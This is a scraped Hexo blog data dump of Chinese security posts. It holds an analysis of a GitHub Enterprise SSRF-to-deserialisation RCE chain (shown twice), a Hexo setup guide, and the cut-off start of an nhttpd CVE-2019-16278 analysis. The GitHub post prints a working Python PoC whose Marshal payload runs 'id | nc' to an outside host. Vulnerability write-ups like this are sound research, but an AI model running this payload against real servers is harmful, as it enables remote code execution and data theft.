Enterprise中的一个这样的服务：<strong>Graphite**</strong>服务，**Graphite中有一个ssrf漏洞，位于</p>\n<p>webapps/graphite/composer/views.py</p>\n<p><strong><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/4-4.png\"></strong></p>\n<p>可以看出Graphite服务可以接收url地址并进行利用，如果后台采用redis进行缓存，漏洞发现者给出下面的利用构造：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png\"></p>\n<p>（注：Graphite服务启用在本地8000端口）</p>\n<p>但是漏洞发现者发现“GitHub Enterprise使用Ruby Gem的Memcached方式来处理缓存，而其通过Marshal模块进行封装” 。并且他提到“GitHub Enterprise Rails控制端中存在反序列化漏洞的Marshal” Marshal模块的反序列化漏洞这里就不介绍了，可以自己分析一下。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>因此最后构造的poc如下：</p>\n<p>#!/usr/bin/python</p>\n<p>from urllib import quote</p>\n<p>‘’’ set up the marshal payload from IRB</p>\n<p>code = “<code>id | nc orange.tw 12345</code>“</p>\n<p>p “\\x04\\x08” + “o”+”:\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy”+”\\x07” + “:\\x0E@instance” + “o”+”:\\x08ERB”+”\\x07” + “:\\x09@src” + Marshal.dump(code)[2..-1] + “:\\x0c@lineno”+ “i\\x00” + “:\\x0C@method”+”:\\x0Bresult”</p>\n<p>‘’’</p>\n<p>marshal_code = ‘\\x04\\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\x07:\\x0e@instanceo:\\x08ERB\\x07:\\t@srcI”\\x1e<code>id | nc orange.tw 12345</code>\\x06:\\x06ET:\\x0c@linenoi\\x00:\\x0c@method:\\x0bresult’</p>\n<p>payload = [</p>\n<p>‘’,</p>\n<p>‘set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d’ % len(marshal_code),</p>\n<p>marshal_code,</p>\n<p>‘’,</p>\n<p>‘’</p>\n<p>]</p>\n<p>payload = map(quote, payload)</p>\n<p>url = ‘<a href=\"http://0.0.0.0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#39;\">http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#39;</a></p>\n<p>print “\\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by <a href=\"mailto:&#x6f;&#x72;&#x61;&#110;&#103;&#x65;&#64;&#x63;&#x68;&#114;&#x6f;&#x6f;&#x74;&#46;&#111;&#114;&#x67;\">&#x6f;&#x72;&#x61;&#110;&#103;&#x65;&#64;&#x63;&#x68;&#114;&#x6f;&#x6f;&#x74;&#46;&#111;&#114;&#x67;</a>“</p>\n<p>print ‘-‘*10 + ‘\\n’</p>\n<p>print url + ‘%0D%0A’.join(payload)</p>\n<p>print ‘’’</p>\n<p>Inserting WebHooks from:</p>\n<p><a href=\"https://ghe-server/:user/:repo/settings/hooks\">https://ghe-server/:user/:repo/settings/hooks</a></p>\n<p>Triggering RCE from:</p>\n<p><a href=\"https://ghe-server/search?q=ggggg&amp;type=Repositories\">https://ghe-server/search?q=ggggg&amp;type=Repositories</a></p>\n<p>‘’’</p>\n<p>&nbsp;</p>\n<p>参考链接</p>\n<p><a href=\"http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html\">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/看见到洞见之楔子.jpg","excerpt":"<p>GitHub Enterprise和GitHub的服务类似，不过它为大型企业的开发团队量身定制。</p>\n<p>根据Github官方博客：GitHub Enterprise包括了Github之前的所有主要功能，包括提交历史、代码浏览、比较视图、推送请求、问题追踪、Wiki、Gist共享代码段、团队管理等，此外，还提供了更强大的API以及一个更漂亮的Web界面。</p>\n<p>在GitHub Enterprise上，你可以在自己的服务器本地运行这些功能。</p>","more":"<h2 id=\"漏洞解读\"><a href=\"#漏洞解读\" class=\"headerlink\" title=\"漏洞解读\"></a>漏洞解读</h2><p>在GitHub Enterprise中，有一个名为WebHook的功能。关于WebHook，我在下面简单的介绍下：</p>\n<p>Webhook是什么？</p>\n<p>Webhook，也就是人们常说的钩子，是一个很有用的工具。可以通过定制 Webhook 来监测用户在 Github.com 上的各种事件，最常见的莫过于 push 事件。如果用户设置了一个监测 push 事件的 Webhook，那么每当用户的这个项目有了任何提交，这个 Webhook 都会被触发，这时 Github 就会发送一个 HTTP POST 请求到用户配置好的地址。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/1-4.png\"> <img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png\"></p>\n<p>GitHub Enterprise中的WebHook功能，在Hooks&amp;services配置选项下。它能在执行选定git操作时执行时自定义HTTP回调。</p>\n<p>GitHub Enterprise通过Gem的faraday-restrict-ip-addresses功能来防止用户请求内部服务。下面看下faraday-restrict-ip-addresses功能是如何防止ssrf的：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/2-5.png\"></p>\n<p>这里可以看出，它是通过限定了一个黑名单的方式，来避免用户在WebHook中添加内网地址。</p>\n<p>漏洞发现者提供了一个方法来绕过这层防护，他提出可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过它：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/3-4.png\"></p>\n<p>这个地址在Linux系统中，0代表的是localhost，在绕过faraday-restrict-ip-addresses中的黑名单同时，可以访问服务器内网资源。</p>\n<p>现在我们可以访问内网资源了，应该想到的的是利用缓存数据进行反序列化来利用，以redis为例，我们要想在redis中写入反序列化数据，就想到要用Python的urllib库曾出过一个头注入的漏洞（CVE-2016-5699）来构造http头向redis写入数据。</p>\n<p>再来看看我们现在控制的这处ssrf，它有一个问题，它是基于通过ruby-Gem的faraday来解析数据的，faraday中不存在CR-LF命令注入，所以没办法通过这个ssrf构造http头向缓存中写东西的。</p>\n<p>下面的思路就是，我们要找到一个内网服务，它需要是python写的（存在头注入的漏洞），并且它也得存在一个ssrf，用来访问本地的缓存服务并向其中写入数据。</p>\n<p>漏洞发现者找到了GitHub Enterprise中的一个这样的服务：<strong>Graphite**</strong>服务，**Graphite中有一个ssrf漏洞，位于</p>\n<p>webapps/graphite/composer/views.py</p>\n<p><strong><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/4-4.png\"></strong></p>\n<p>可以看出Graphite服务可以接收url地址并进行利用，如果后台采用redis进行缓存，漏洞发现者给出下面的利用构造：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png\"></p>\n<p>（注：Graphite服务启用在本地8000端口）</p>\n<p>但是漏洞发现者发现“GitHub Enterprise使用Ruby Gem的Memcached方式来处理缓存，而其通过Marshal模块进行封装” 。并且他提到“GitHub Enterprise Rails控制端中存在反序列化漏洞的Marshal” Marshal模块的反序列化漏洞这里就不介绍了，可以自己分析一下。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>因此最后构造的poc如下：</p>\n<p>#!/usr/bin/python</p>\n<p>from urllib import quote</p>\n<p>‘’’ set up the marshal payload from IRB</p>\n<p>code = “<code>id | nc orange.tw 12345</code>“</p>\n<p>p “\\x04\\x08” + “o”+”:\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy”+”\\x07” + “:\\x0E@instance” + “o”+”:\\x08ERB”+”\\x07” + “:\\x09@src” + Marshal.dump(code)[2..-1] + “:\\x0c@lineno”+ “i\\x00” + “:\\x0C@method”+”:\\x0Bresult”</p>\n<p>‘’’</p>\n<p>marshal_code = ‘\\x04\\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\x07:\\x0e@instanceo:\\x08ERB\\x07:\\t@srcI”\\x1e<code>id | nc orange.tw 12345</code>\\x06:\\x06ET:\\x0c@linenoi\\x00:\\x0c@method:\\x0bresult’</p>\n<p>payload = [</p>\n<p>‘’,</p>\n<p>‘set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d’ % len(marshal_code),</p>\n<p>marshal_code,</p>\n<p>‘’,</p>\n<p>‘’</p>\n<p>]</p>\n<p>payload = map(quote, payload)</p>\n<p>url = ‘<a href=\"http://0.0.0.0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#39;\">http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#39;</a></p>\n<p>print “\\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by <a href=\"mailto:&#x6f;&#x72;&#x61;&#110;&#103;&#x65;&#64;&#x63;&#x68;&#114;&#x6f;&#x6f;&#x74;&#46;&#111;&#114;&#x67;\">&#x6f;&#x72;&#x61;&#110;&#103;&#x65;&#64;&#x63;&#x68;&#114;&#x6f;&#x6f;&#x74;&#46;&#111;&#114;&#x67;</a>“</p>\n<p>print ‘-‘*10 + ‘\\n’</p>\n<p>print url + ‘%0D%0A’.join(payload)</p>\n<p>print ‘’’</p>\n<p>Inserting WebHooks from:</p>\n<p><a href=\"https://ghe-server/:user/:repo/settings/hooks\">https://ghe-server/:user/:repo/settings/hooks</a></p>\n<p>Triggering RCE from:</p>\n<p><a href=\"https://ghe-server/search?q=ggggg&amp;type=Repositories\">https://ghe-server/search?q=ggggg&amp;type=Repositories</a></p>\n<p>‘’’</p>\n<p>&nbsp;</p>\n<p>参考链接</p>\n<p><a href=\"http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html\">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a></p>"},{"title":"震惊！Hexo+github创建个人博客避坑攻略","date":"2017-05-18T11:31:00.000Z","cover":"https://s1.ax1x.com/2020/03/19/8sTqVP.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"I have a dream！我要有个<font color=#FF7F50>免费</font>blog！\n\n使用hexo + github + theme，建立一个自己的blog并非困难，网上的相关资料很多，也很详细。\n\n具体的搭建过程可以参照这个链接: https://zhuanlan.zhihu.com/p/22191919。\n\n另外附上hexo的官方文档链接: https://hexo.io/zh-cn/docs/。\n\n很easy吧！很刺激吧！震惊吧！在读完上面的搭建过程后，如果后仍有兴趣搭建一个自己的Glog，在动手前，请先看看我这篇文章。\n\n这篇文章重点<font color=#FF7F50>不是</font>教你如何建立博客，而是写一点我实战中遇到的坑，好让大家避开坑。下面我要开始讲讲怎么<font color=#FF7F50>避坑</font>了。\n<!--more-->\n</br>  \n### 项目命名问题\n<div align=center>\n{% asset_img 1.png%}\n</div>\n我嫌原作者画的圈不够粗，重新在这里强调一下，这个项目的命名一定要是<font color=#FF7F50>你的github账号名</font>.github.io，要不github一定狠狠地把404甩你脸上。\n\n这个项目名称也是作为你blog建立起来后访问的网址，如果嫌你github名字起的太随意，先改一下自己的github账户名再来建项目。\n\nGithub改账户名在下图这里\n<div align=center>\n{% asset_img 2.png%}\n</div>\n<div align=center>\n{% asset_img 3.png%}\n</div>\n</br>\n### 在不同电脑上更新博客\n你需要在公司和家里两台电脑上更新博客，虽然说hexo控制端是在本地工作的的，但是你在公司电脑上新生成了一个文章，hexo d发布了，回家后，一不小心在电脑上hexo d 了一下，家里电脑中并没有你新生成的文章的md文件。结果是blog上内容又还原到你家里电脑中的状态了。\n惊喜不！\n其实解决办法很简单，把hexo控制端也放到你的项目里作为一个分支，完成修改时候push下，然后用的时候pull一下就可以了，方法如下:\n```\n在你项目里创建一个分支：hexo，这时候你的这个项目里就有两个分支了，master放hexo生成的静态网站，hexo放你的hexo控制端代码\n把项目hexo分支克隆到你用的几台机器上，切到hexo分支\n每次要用hexo控制端时，先pull下最新的commit\n删除目录下.deploy_git/（这个是个大坑，有时hexo d会出冲突，这个默认是隐藏的，ubuntu可以用ll指令显示）\n开始你的表演（写文章或是其他的。。。）\n当决定要结束这台机器上的创作了，依次执行git add .、git commit -m \"...\"、git push hexo提交控制端变动；\n```\n</br>\n### theme的选择与使用\n先附上hexo的主题链接: https://hexo.io/themes/\n\n选择一个你喜欢的主题，进入对应的github项目中clone这个主题到本地themes文件夹中并分别在hexo的_config.yml和主题的_config.yml中配置相关配置。\n\n这里的坑是，如果直接将中意的主题git clone到你的themes文件夹中，假如你的hexo控制端文件夹本来就是个git项目，这个项目里的themes文件夹里又嵌套了个git项目，就会导致被嵌套的git仓库的改动，不能被大git仓库检测到。这样最直观的\n\n针对这种问题，可以直接把主题中的.git/文件删除，或者直接下载项目的压缩包然后在themes文件夹中解压。\n</br>\n### md文件的修改与编写\nhexo使用markdown来编辑文章，在markdown中，可以用#来标识几级标题。\n但是在我写这篇文章时，发现###标题###没有被解析，原封不动的被打印出来了，如过出现这种情况，请记得试试在#与标题文字之间加一个空格，这种情况同样适用于_config.yml配置文件的修改中，参数和值之间的空格千万别忘记了（如source_dir: source之间的空格）\n\n\n\n\n","source":"_posts/hexohelp.md","raw":"---\ntitle: 震惊！Hexo+github创建个人博客避坑攻略\ndate: 2017-05-18 19:31:00\ntags: 技术分享\ncategories: 技术\ncover: https://s1.ax1x.com/2020/03/19/8sTqVP.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\nI have a dream！我要有个<font color=#FF7F50>免费</font>blog！\n\n使用hexo + github + theme，建立一个自己的blog并非困难，网上的相关资料很多，也很详细。\n\n具体的搭建过程可以参照这个链接: https://zhuanlan.zhihu.com/p/22191919。\n\n另外附上hexo的官方文档链接: https://hexo.io/zh-cn/docs/。\n\n很easy吧！很刺激吧！震惊吧！在读完上面的搭建过程后，如果后仍有兴趣搭建一个自己的Glog，在动手前，请先看看我这篇文章。\n\n这篇文章重点<font color=#FF7F50>不是</font>教你如何建立博客，而是写一点我实战中遇到的坑，好让大家避开坑。下面我要开始讲讲怎么<font color=#FF7F50>避坑</font>了。\n<!--more-->\n</br>  \n### 项目命名问题\n<div align=center>\n{% asset_img 1.png%}\n</div>\n我嫌原作者画的圈不够粗，重新在这里强调一下，这个项目的命名一定要是<font color=#FF7F50>你的github账号名</font>.github.io，要不github一定狠狠地把404甩你脸上。\n\n这个项目名称也是作为你blog建立起来后访问的网址，如果嫌你github名字起的太随意，先改一下自己的github账户名再来建项目。\n\nGithub改账户名在下图这里\n<div align=center>\n{% asset_img 2.png%}\n</div>\n<div align=center>\n{% asset_img 3.png%}\n</div>\n</br>\n### 在不同电脑上更新博客\n你需要在公司和家里两台电脑上更新博客，虽然说hexo控制端是在本地工作的的，但是你在公司电脑上新生成了一个文章，hexo d发布了，回家后，一不小心在电脑上hexo d 了一下，家里电脑中并没有你新生成的文章的md文件。结果是blog上内容又还原到你家里电脑中的状态了。\n惊喜不！\n其实解决办法很简单，把hexo控制端也放到你的项目里作为一个分支，完成修改时候push下，然后用的时候pull一下就可以了，方法如下:\n```\n在你项目里创建一个分支：hexo，这时候你的这个项目里就有两个分支了，master放hexo生成的静态网站，hexo放你的hexo控制端代码\n把项目hexo分支克隆到你用的几台机器上，切到hexo分支\n每次要用hexo控制端时，先pull下最新的commit\n删除目录下.deploy_git/（这个是个大坑，有时hexo d会出冲突，这个默认是隐藏的，ubuntu可以用ll指令显示）\n开始你的表演（写文章或是其他的。。。）\n当决定要结束这台机器上的创作了，依次执行git add .、git commit -m \"...\"、git push hexo提交控制端变动；\n```\n</br>\n### theme的选择与使用\n先附上hexo的主题链接: https://hexo.io/themes/\n\n选择一个你喜欢的主题，进入对应的github项目中clone这个主题到本地themes文件夹中并分别在hexo的_config.yml和主题的_config.yml中配置相关配置。\n\n这里的坑是，如果直接将中意的主题git clone到你的themes文件夹中，假如你的hexo控制端文件夹本来就是个git项目，这个项目里的themes文件夹里又嵌套了个git项目，就会导致被嵌套的git仓库的改动，不能被大git仓库检测到。这样最直观的\n\n针对这种问题，可以直接把主题中的.git/文件删除，或者直接下载项目的压缩包然后在themes文件夹中解压。\n</br>\n### md文件的修改与编写\nhexo使用markdown来编辑文章，在markdown中，可以用#来标识几级标题。\n但是在我写这篇文章时，发现###标题###没有被解析，原封不动的被打印出来了，如过出现这种情况，请记得试试在#与标题文字之间加一个空格，这种情况同样适用于_config.yml配置文件的修改中，参数和值之间的空格千万别忘记了（如source_dir: source之间的空格）\n\n\n\n\n","slug":"hexohelp","published":1,"updated":"2020-10-27T09:25:29.413Z","_id":"ckgrozu9k003swsa971zzg32u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>I have a dream！我要有个<font color=#FF7F50>免费</font>blog！</p>\n<p>使用hexo + github + theme，建立一个自己的blog并非困难，网上的相关资料很多，也很详细。</p>\n<p>具体的搭建过程可以参照这个链接: <a href=\"https://zhuanlan.zhihu.com/p/22191919%E3%80%82\">https://zhuanlan.zhihu.com/p/22191919。</a></p>\n<p>另外附上hexo的官方文档链接: <a href=\"https://hexo.io/zh-cn/docs/%E3%80%82\">https://hexo.io/zh-cn/docs/。</a></p>\n<p>很easy吧！很刺激吧！震惊吧！在读完上面的搭建过程后，如果后仍有兴趣搭建一个自己的Glog，在动手前，请先看看我这篇文章。</p>\n<p>这篇文章重点<font color=#FF7F50>不是</font>教你如何建立博客，而是写一点我实战中遇到的坑，好让大家避开坑。下面我要开始讲讲怎么<font color=#FF7F50>避坑</font>了。</p>\n<a id=\"more\"></a>\n</br>  \n### 项目命名问题\n<div align=center>\n<img src= \"/img/loading.gif\" data-lazy-src=\"/hexohelp/1.png\" class=\"\">\n</div>\n我嫌原作者画的圈不够粗，重新在这里强调一下，这个项目的命名一定要是<font color=#FF7F50>你的github账号名</font>.github.io，要不github一定狠狠地把404甩你脸上。\n\n<p>这个项目名称也是作为你blog建立起来后访问的网址，如果嫌你github名字起的太随意，先改一下自己的github账户名再来建项目。</p>\n<p>Github改账户名在下图这里</p>\n<div align=center>\n<img src= \"/img/loading.gif\" data-lazy-src=\"/hexohelp/2.png\" class=\"\">\n</div>\n<div align=center>\n<img src= \"/img/loading.gif\" data-lazy-src=\"/hexohelp/3.png\" class=\"\">\n</div>\n</br>\n### 在不同电脑上更新博客\n你需要在公司和家里两台电脑上更新博客，虽然说hexo控制端是在本地工作的的，但是你在公司电脑上新生成了一个文章，hexo d发布了，回家后，一不小心在电脑上hexo d 了一下，家里电脑中并没有你新生成的文章的md文件。结果是blog上内容又还原到你家里电脑中的状态了。\n惊喜不！\n其实解决办法很简单，把hexo控制端也放到你的项目里作为一个分支，完成修改时候push下，然后用的时候pull一下就可以了，方法如下:\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在你项目里创建一个分支：hexo，这时候你的这个项目里就有两个分支了，master放hexo生成的静态网站，hexo放你的hexo控制端代码</span><br><span class=\"line\">把项目hexo分支克隆到你用的几台机器上，切到hexo分支</span><br><span class=\"line\">每次要用hexo控制端时，先pull下最新的<span class=\"keyword\">commit</span></span><br><span class=\"line\">删除目录下.deploy_git/（这个是个大坑，有时hexo d会出冲突，这个默认是隐藏的，ubuntu可以用ll指令显示）</span><br><span class=\"line\">开始你的表演（写文章或是其他的。。。）</span><br><span class=\"line\">当决定要结束这台机器上的创作了，依次执行git <span class=\"keyword\">add</span> .、git <span class=\"keyword\">commit</span> -m &quot;...&quot;、git push hexo提交控制端变动；</span><br></pre></td></tr></table></figure>\n</br>\n### theme的选择与使用\n先附上hexo的主题链接: https://hexo.io/themes/\n\n<p>选择一个你喜欢的主题，进入对应的github项目中clone这个主题到本地themes文件夹中并分别在hexo的_config.yml和主题的_config.yml中配置相关配置。</p>\n<p>这里的坑是，如果直接将中意的主题git clone到你的themes文件夹中，假如你的hexo控制端文件夹本来就是个git项目，这个项目里的themes文件夹里又嵌套了个git项目，就会导致被嵌套的git仓库的改动，不能被大git仓库检测到。这样最直观的</p>\n<p>针对这种问题，可以直接把主题中的.git/文件删除，或者直接下载项目的压缩包然后在themes文件夹中解压。<br></br></p>\n<h3 id=\"md文件的修改与编写\"><a href=\"#md文件的修改与编写\" class=\"headerlink\" title=\"md文件的修改与编写\"></a>md文件的修改与编写</h3><p>hexo使用markdown来编辑文章，在markdown中，可以用#来标识几级标题。<br>但是在我写这篇文章时，发现###标题###没有被解析，原封不动的被打印出来了，如过出现这种情况，请记得试试在#与标题文字之间加一个空格，这种情况同样适用于_config.yml配置文件的修改中，参数和值之间的空格千万别忘记了（如source_dir: source之间的空格）</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>I have a dream！我要有个<font color=#FF7F50>免费</font>blog！</p>\n<p>使用hexo + github + theme，建立一个自己的blog并非困难，网上的相关资料很多，也很详细。</p>\n<p>具体的搭建过程可以参照这个链接: <a href=\"https://zhuanlan.zhihu.com/p/22191919%E3%80%82\">https://zhuanlan.zhihu.com/p/22191919。</a></p>\n<p>另外附上hexo的官方文档链接: <a href=\"https://hexo.io/zh-cn/docs/%E3%80%82\">https://hexo.io/zh-cn/docs/。</a></p>\n<p>很easy吧！很刺激吧！震惊吧！在读完上面的搭建过程后，如果后仍有兴趣搭建一个自己的Glog，在动手前，请先看看我这篇文章。</p>\n<p>这篇文章重点<font color=#FF7F50>不是</font>教你如何建立博客，而是写一点我实战中遇到的坑，好让大家避开坑。下面我要开始讲讲怎么<font color=#FF7F50>避坑</font>了。</p>","more":"</br>  \n### 项目命名问题\n<div align=center>\n<img src=\"/hexohelp/1.png\" class=\"\">\n</div>\n我嫌原作者画的圈不够粗，重新在这里强调一下，这个项目的命名一定要是<font color=#FF7F50>你的github账号名</font>.github.io，要不github一定狠狠地把404甩你脸上。\n\n<p>这个项目名称也是作为你blog建立起来后访问的网址，如果嫌你github名字起的太随意，先改一下自己的github账户名再来建项目。</p>\n<p>Github改账户名在下图这里</p>\n<div align=center>\n<img src=\"/hexohelp/2.png\" class=\"\">\n</div>\n<div align=center>\n<img src=\"/hexohelp/3.png\" class=\"\">\n</div>\n</br>\n### 在不同电脑上更新博客\n你需要在公司和家里两台电脑上更新博客，虽然说hexo控制端是在本地工作的的，但是你在公司电脑上新生成了一个文章，hexo d发布了，回家后，一不小心在电脑上hexo d 了一下，家里电脑中并没有你新生成的文章的md文件。结果是blog上内容又还原到你家里电脑中的状态了。\n惊喜不！\n其实解决办法很简单，把hexo控制端也放到你的项目里作为一个分支，完成修改时候push下，然后用的时候pull一下就可以了，方法如下:\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在你项目里创建一个分支：hexo，这时候你的这个项目里就有两个分支了，master放hexo生成的静态网站，hexo放你的hexo控制端代码</span><br><span class=\"line\">把项目hexo分支克隆到你用的几台机器上，切到hexo分支</span><br><span class=\"line\">每次要用hexo控制端时，先pull下最新的<span class=\"keyword\">commit</span></span><br><span class=\"line\">删除目录下.deploy_git/（这个是个大坑，有时hexo d会出冲突，这个默认是隐藏的，ubuntu可以用ll指令显示）</span><br><span class=\"line\">开始你的表演（写文章或是其他的。。。）</span><br><span class=\"line\">当决定要结束这台机器上的创作了，依次执行git <span class=\"keyword\">add</span> .、git <span class=\"keyword\">commit</span> -m &quot;...&quot;、git push hexo提交控制端变动；</span><br></pre></td></tr></table></figure>\n</br>\n### theme的选择与使用\n先附上hexo的主题链接: https://hexo.io/themes/\n\n<p>选择一个你喜欢的主题，进入对应的github项目中clone这个主题到本地themes文件夹中并分别在hexo的_config.yml和主题的_config.yml中配置相关配置。</p>\n<p>这里的坑是，如果直接将中意的主题git clone到你的themes文件夹中，假如你的hexo控制端文件夹本来就是个git项目，这个项目里的themes文件夹里又嵌套了个git项目，就会导致被嵌套的git仓库的改动，不能被大git仓库检测到。这样最直观的</p>\n<p>针对这种问题，可以直接把主题中的.git/文件删除，或者直接下载项目的压缩包然后在themes文件夹中解压。<br></br></p>\n<h3 id=\"md文件的修改与编写\"><a href=\"#md文件的修改与编写\" class=\"headerlink\" title=\"md文件的修改与编写\"></a>md文件的修改与编写</h3><p>hexo使用markdown来编辑文章，在markdown中，可以用#来标识几级标题。<br>但是在我写这篇文章时，发现###标题###没有被解析，原封不动的被打印出来了，如过出现这种情况，请记得试试在#与标题文字之间加一个空格，这种情况同样适用于_config.yml配置文件的修改中，参数和值之间的空格千万别忘记了（如source_dir: source之间的空格）</p>"},{"title":"nhttpd 从目录穿越到远程代码执行漏洞分析(CVE-2019-16278)","date":"2019-11-12T06:17:50.000Z","cover":"https://s2.ax1x.com/2019/11/12/M1fCr9.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nnhttpd是Marcus Glocker设计的开源Web服务器，也称为NostromoWeb服务器。\n\nnhttpd通过select(2)处理正常的并发连接，但是为了提高效率（例如列目录和CGI执行），它使用fork(2)以提高效率。\n\n<!--more-->\n\n下图为nostromo以及apache和thttpd在处理1KB文件，16KB文件、执行CGI时的性能比较\n\n![M1gYnI.png](https://s2.ax1x.com/2019/11/12/M1gYnI.png)\n\n![M1gen1.png](https://s2.ax1x.com/2019/11/12/M1gen1.png)\n\n![M1gMtO.png](https://s2.ax1x.com/2019/11/12/M1gMtO.png)\n\n## 漏洞描述\n\nnhttpd 1.9.6及之前版本中存在路径穿越漏洞。攻击者可利用该漏洞访问web server路径之外的文件。\n\n## 漏洞分析\n\n### 目录穿越\n\n在main.c中，处理header处存在如下代码\n\n[![M1gn76.png](https://s2.ax1x.com/2019/11/12/M1gn76.png)](https://imgchr.com/i/M1gn76)\n\n程序将会调用http_verify对每个header进行有效性验证，如上图1568行\n\n当http_verify函数对header有效性验证通过后，会调用http_proc对header进行处理，以及后续操作\n\n\n\n跟入http_verify方法中\n\n[![M1g31H.png](https://s2.ax1x.com/2019/11/12/M1g31H.png)](https://imgchr.com/i/M1g31H)\n\n在header有效性验证环节(http_verify)中，http_verify方法验证了header是否可以被url解码、method是否效、以及是否存在”/../”目录变量这样的字符串等内容\n\n![M1gGjA.png](https://s2.ax1x.com/2019/11/12/M1gGjA.png)\n\n上图：header是否可以被url解码http_decode_header_uri，该方法有三种可能的返回值，-1(error）/ 0 (不需要解码)/ 解码后的值。-1则返回400状态码\n\n![M1gm0x.png](https://s2.ax1x.com/2019/11/12/M1gm0x.png)\n\n上图：判断header 是否是GET/POST/HEAD 